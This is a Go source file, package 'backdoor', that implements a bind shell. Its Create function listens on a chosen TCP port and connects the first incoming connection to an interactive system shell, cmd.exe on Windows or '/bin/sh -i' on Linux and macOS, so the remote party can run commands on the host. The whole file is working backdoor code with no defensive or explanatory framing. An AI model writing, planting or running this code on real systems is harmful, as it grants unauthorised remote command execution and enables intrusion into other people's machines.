package backdoor

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"
)

const tcp = "tcp"

var signals = []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT}

// Create initializes a new backdoor that allows the incoming connection shell access on the system.
func Create(port int) {
	cmd, err := getSysCmd()
	if err != nil {
		log.Println(err)
		return
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, signals...)
	connChan := make(chan net.Conn, 1)

	lsnr, err := net.Listen(tcp, fmt.Sprintf(":%d", port))
	if err != nil {
		log.Println(err)
		return
	}

	go func() {
		conn, err := lsnr.Accept()
		if err != nil {
			log.Println(err)
			return
		}
		log.Printf("connection established : %s\n", conn.RemoteAddr().String())
		connChan <- conn
	}()

	for {
		select {
		case signal := <-stop:
			log.Printf("\nreceived %s signal\ndisconnecting...", signal)
			close(connChan)
			for conn := range connChan {
				conn.Close()
			}
			return
		case conn := <-connChan:
			go handle(cmd, conn)
		default:
			time.Sleep(time.Millisecond * 250)
			continue
		}
	}
}

func handle(cmd *exec.Cmd, conn net.Conn) {
	defer conn.Close()
	r, w := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = w
	go io.Copy(conn, r)
	cmd.Run()
}

func getSysCmd() (*exec.Cmd, error) {
	var err error
	switch runtime.GOOS {
	case "windows":
		return exec.Command("cmd.exe"), nil
	case "darwin", "linux":
		return exec.Command("/bin/sh", "-i"), nil
	default:
		err = fmt.Errorf("os %s not supported", runtime.GOOS)
	}
	return nil, err
}
